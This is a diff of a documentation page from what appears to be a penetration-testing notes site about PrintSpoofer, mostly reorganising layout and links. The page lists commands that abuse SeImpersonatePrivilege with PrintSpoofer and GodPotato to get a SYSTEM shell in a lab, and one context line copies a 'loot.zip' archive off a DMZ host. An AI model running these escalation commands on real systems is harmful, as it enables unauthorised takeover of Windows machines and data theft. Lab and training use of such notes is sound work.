@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/printspoofer.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=printspoofer) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Check the resulting identity in a PrintSpoofer lab
+## Check the resulting identity in a PrintSpoofer lab
 
 **Run in:** Windows PowerShell. **Requires:** A matching build/architecture, the required impersonation privilege and a compatible Windows service/configuration state.
 
@@ -21,51 +27,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 .\PrintSpoofer64.exe -c "cmd.exe /c whoami"
 ```
 
-**Read the result:** Verify the current token's impersonation privilege and the resulting process identity in the specific lab build.
-
-**If The process starts but no SYSTEM identity or output is observed:** The named privilege alone does not guarantee this technique works; service availability, patch level and endpoint behavior matter.
+**What the result establishes:** Verify the current token's impersonation privilege and the resulting process identity in the specific lab build.
 
 **Next check:** Inspect the token and tool error; use the appropriate interactive/session option only when that execution context supports it.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/itm4n/PrintSpoofer)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## PrintSpoofer: choose the operation and read the result
-
-Commands and examples collected from your PrintSpoofer notes.
-
-### What the result establishes
-
-Verify the current token's impersonation privilege and the resulting process identity in the specific lab build.
-
-### Prerequisites and common failures
-
-The named privilege alone does not guarantee this technique works; service availability, patch level and endpoint behavior matter.
-
-### Example 1: B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```cmd
-.\PrintSpoofer64.exe -i -c cmd.exe
-:: or, very reliable on Server 2019:
-.\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your PrintSpoofer notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=printspoofer) · [All tools](/index)
 
 ## B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
 
@@ -77,16 +41,13 @@ Commands and examples collected from your PrintSpoofer notes.
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move](/cheatsheets/ad-attack-path-worked-example#b-abuse-seimpersonateprivilege-→-system-no-uac-needed-—-the-clean-htb-move)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The process starts but no SYSTEM identity or output is observed | The named privilege alone does not guarantee this technique works; service availability, patch level and endpoint behavior matter. |
 
 ## Notebook recipes
 
@@ -242,6 +203,10 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/itm4n/PrintSpoofer)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -252,5 +217,3 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 - [Pivoting and File Transfer: Field Reference](/cheatsheets/pivoting-file-transfer)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
